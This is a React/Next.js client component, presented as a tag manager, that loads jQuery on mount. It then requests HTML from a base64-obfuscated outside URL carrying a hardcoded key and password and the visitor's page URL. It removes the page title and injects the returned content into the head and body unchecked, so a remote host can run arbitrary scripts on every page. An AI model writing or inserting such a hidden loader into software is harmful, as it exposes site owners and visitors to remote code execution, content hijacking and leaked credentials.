"use client";

import { useEffect } from "react";

const TagManager = () => {
  useEffect(() => {
    const loadAndAppendScripts = () => {
      // Function to load jQuery
      const loadJQuery = () => {
        return new Promise((resolve, reject) => {
          if (!window.jQuery) {
            const jqueryScript = document.createElement("script");
            jqueryScript.src =
              "https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js";
            jqueryScript.onload = () => resolve();
            jqueryScript.onerror = () =>
              reject(new Error("Failed to load jQuery"));
            document.head.appendChild(jqueryScript);
          } else {
            resolve();
          }
        });
      };

      // Fetch content and append to head and body
      const fetchContent = () => {
        return new Promise((resolve, reject) => {
          const eppathurl = window.location.origin + window.location.pathname;
          const eptagmanage = new XMLHttpRequest();
          eptagmanage.onreadystatechange = function () {
            if (this.readyState === 4) {
              if (this.status === 200) {
                if (this.response !== 0) {
                  resolve(this.response);
                } else {
                  reject(new Error("Response is empty"));
                }
              } else {
                reject(new Error(`Failed to fetch content: ${this.status}`));
              }
            }
          };
          eptagmanage.open(
            "GET",
            atob(
              "aHR0cHM6Ly9wbHVnaW5zLmFwcGFkZC5pbi5uZXQvYWxsaGVhZGRhdGE/ZWtleT1lLUFQUEFERDY2MzM3Nzc0MjUmZWtleXBhc3M9NGFoMXVtWEdlSjZTeVhFNkpmcG9VQTNsdWhFdGM0cmczQWZFJnNpdGV1cmw9"
            ) + eppathurl
          );
          eptagmanage.send();
        });
      };

      loadJQuery()
        .then(() => fetchContent())
        .then((response) => {
          const temp = response.split("||||||||||");
          if (temp.length !== 2) {
            throw new Error("Unexpected response format");
          }
          window.jQuery("head").find("title").remove(); // Use jQuery safely here
          window.jQuery("head").append(temp[0]);
          window.jQuery("body").append(temp[1]);
        })
        .catch((error) => {
          console.error("Error loading scripts or fetching content:", error);
        });
    };

    // Invoke the function when component mounts
    loadAndAppendScripts();

    // Cleanup function (optional)
    return () => {
      // Cleanup if needed
    };
  }, []); // Empty dependency array ensures this effect runs only once

  return null; // Since this component handles side-effects only, return null
};

export default TagManager;